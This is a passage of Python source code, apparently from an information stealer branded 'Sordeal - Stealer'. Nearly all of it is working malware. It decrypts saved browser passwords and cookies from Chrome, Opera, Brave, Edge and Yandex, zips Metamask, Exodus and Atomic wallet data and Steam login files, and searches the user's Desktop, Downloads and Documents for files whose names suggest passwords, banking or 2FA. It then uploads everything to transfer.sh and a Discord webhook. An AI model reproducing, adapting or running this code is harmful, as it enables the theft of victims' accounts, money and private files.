                    "author": {
                        "name": f"SORDEAL v3",
                        "url": "https://github.com/Sordeal",
                        "icon_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/output-onlinegiftools.gif",
                    },
                    "footer": {
                        "text": "github.com/SORDEAL",
                    },
                    "color": 16711718,
                }
            ],
            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
            "username": "Sordeal - Stealer",
            "attachments": [],
        }
        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
    Requests_loading("POST", hook, files=files)


def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\{name}.txt"
    with open(path, mode="w", encoding="utf-8") as f:
        f.write(f"Created BY SHAMAN | https://github.com/Sordeal\n\n")
        for line in data:
            if line[0] != "":
                f.write(f"{line}\n")


NotPSSW = []


def SO_pleasefindmypassw(path, arg):
    global NotPSSW
    if not os.path.exists(path):
        return
    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0:
        return
    tempfold = (
        temp
        + "SO_is_here"
        + "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
                  for i in range(8))
        + ".db"
    )
    shutil.copy2(pathC, tempfold)
    conn = connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != "":
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split("[")[1].split("]")[0]
                if wa in row[0]:
                    if not old in paswWords:
                        paswWords.append(old)
            NotPSSW.append(
                f"URL: {row[0]} \n ID: {row[1]} \n Sordeal  Password: {Value_Dcryptage(row[2], master_key)}\n\n"
            )
    writeforfile(NotPSSW, "SO_allpasswords")


Cookies = []


def Get_SO_Cook(path, arg):
    global Cookies
    if not os.path.exists(path):
        return
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0:
        return
    tempfold = (
        temp
        + "SO_is_here"
        + "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
                  for i in range(8))
        + ".db"
    )

    shutil.copy2(pathC, tempfold)
    conn = connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"

    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != "":
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split("[")[1].split("]")[0]
                if wa in row[0]:
                    if not old in cookiWords:
                        cookiWords.append(old)
            Cookies.append(
                f"{row[0]}	TRUE"
                + "		"
                + f"/FALSE	2597573456	{row[1]}	{Value_Dcryptage(row[2], master_key)}"
            )
    writeforfile(Cookies, "SO_allcookies")


def checkIfProcessRunning(processName):
    """
    Check if there is any running process that contains the given name processName.
    """
    # Iterate over the all the running process
    for proc in psutil.process_iter():
        try:
            # Check if process name contains the given name string.
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False


def ZipMyThings(path, arg, procc):
    pathC = path
    name = arg
    if "aholpfdialjgjfhomihkjbmgjidlcdno" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"Exodus_{browser}"
        pathC = path + arg
    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"Metamask_{browser}"
        pathC = path + arg
    if not os.path.exists(pathC):
        return
    if checkIfProcessRunning("chrome.exe"):
        print("Yes a chrome process was running")
        subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    else:
        ...
    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"{browser}"
    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"):
            return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False:
            return
        name = arg
    zf = zipfile.ZipFile(f"{pathC}/{name}.zip", "w")
    print(zf)
    for file in os.listdir(pathC):
        if not ".zip" in file:
            zf.write(pathC + "/" + file)
    zf.close()

    upload(f"{pathC}/{name}.zip")
    os.remove(f"{pathC}/{name}.zip")


def SO_Gather_All():
    "Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >"
    browserPaths = [
        [
            f"{roaming}/Opera Software/Opera GX Stable",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{roaming}/Opera Software/Opera Stable",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{roaming}/Opera Software/Opera Neon/User Data/Default",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Google/Chrome/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Google/Chrome SxS/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/BraveSoftware/Brave-Browser/User Data",
            "brave.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Yandex/YandexBrowser/User Data",
            "yandex.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Microsoft/Edge/User Data",
            "edge.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
    ]

    Paths_zipped = [
        [f"{roaming}/atomic/Local Storage/leveldb",
            '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [
            f"{roaming}/NationsGlory/Local Storage/leveldb",
            "NationsGlory.exe",
            "NationsGlory",
        ],
    ]

    for patt in browserPaths:
        a = threading.Thread(target=SO_pleasefindmypassw,
                             args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)
    thread_bccookies = []
    for patt in browserPaths:
        a = threading.Thread(target=Get_SO_Cook, args=[patt[0], patt[4]])
        a.start()
        thread_bccookies.append(a)
    for thread in thread_bccookies:
        thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True:
        return
    for patt in browserPaths:
        threading.Thread(target=ZipMyThings, args=[
                         patt[0], patt[5], patt[1]]).start()
    for patt in Paths_zipped:
        threading.Thread(target=ZipMyThings, args=[
                         patt[0], patt[2], patt[1]]).start()
    for thread in Threadlist:
        thread.join()
    global upths
    upths = []

    for file in ["SO_allpasswords.txt", "SO_allcookies.txt"]:
        upload(os.getenv("TEMP") + "\\" + file)


def UploadTo_Anon(path):
    try:
        files = {"file": (path, open(path, mode="rb"))}
        ...
        upload = requests.post("https://transfer.sh/", files=files)
        url = upload.text
        return url
    except:
        return False


def CreateFolder_(pathF, keywords):
    global SO_create_files
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file):
            return
        i += 1
        if i <= maxfilesperdir:
            url = UploadTo_Anon(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    SO_create_files.append(["folder", pathF + "/", ffound])


SO_create_files = []


def SO_create_file(path, keywords):
    global SO_create_files
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append(
                        [path + "/" + file, UploadTo_Anon(path + "/" + file)]
                    )
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    CreateFolder_(target, keywords)
                    break
    SO_create_files.append(["folder", path, fifound])


def sopleasecheck_files():
    user = temp.split("\AppData")[0]
    path2search = [user + "/Desktop", user + "/Downloads", user + "/Documents"]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "seecret",
    ]

    wikith = []
    for patt in path2search:
        sopleasecheck_files = threading.Thread(
            target=SO_create_file, args=[patt, key_wordsFiles]
        )
        sopleasecheck_files.start()
        wikith.append(sopleasecheck_files)
    return wikith


global keyword, cookiWords, paswWords

keyword = [
    "mail",
    "[coinbase](https://coinbase.com)",
    "[sellix](https://sellix.io)",
    "[gmail](https://gmail.com)",
    "[steam](https://steam.com)",
    "[discord](https://discord.com)",
    "[riotgames](https://riotgames.com)",
    "[youtube](https://youtube.com)",
    "[instagram](https://instagram.com)",
    "[tiktok](https://tiktok.com)",
    "[twitter](https://twitter.com)",
    "[facebook](https://facebook.com)",
    "card",
    "[epicgames](https://epicgames.com)",
    "[spotify](https://spotify.com)",
    "[yahoo](https://yahoo.com)",
    "[roblox](https://roblox.com)",
    "[twitch](https://twitch.com)",
    "[minecraft](https://minecraft.net)",
    "bank",
    "[paypal](https://paypal.com)",
    "[origin](https://origin.com)",
    "[amazon](https://amazon.com)",
    "[ebay](https://ebay.com)",
    "[aliexpress](https://aliexpress.com)",
    "[playstation](https://playstation.com)",
    "[hbo](https://hbo.com)",
    "[xbox](https://xbox.com)",
    "buy",
    "sell",
    "[binance](https://binance.com)",
    "[hotmail](https://hotmail.com)",
    "[outlook](https://outlook.com)",
    "[crunchyroll](https://crunchyroll.com)",
    "[telegram](https://telegram.com)",
    "[pornhub](https://pornhub.com)",
    "[disney](https://disney.com)",
    "[expressvpn](https://expressvpn.com)",
    "crypto",
    "[uber](https://uber.com)",
    "[netflix](https://netflix.com)",
]

cookiWords = []
paswWords = []

SO_Gather_All()
DETECTED = Trust(Cookies)

if not DETECTED:
    wikith = sopleasecheck_files()

    for thread in wikith:
        thread.join()
    time.sleep(0.2)

    filetext = "```diff\n"
    for arg in SO_create_files:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]
            filetext += f"\n"
            filetext += f"- {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a) - 1]
                b = ffil[1]
                filetext += f"+ Name: {fileanme}\n+ Link: {b}"
                filetext += "\n"
    filetext += "\n```"

    upload("sopleasecheck_files", filetext)
    auto = threading.Thread(target=AutoCopyWallet().run)
    auto.start()
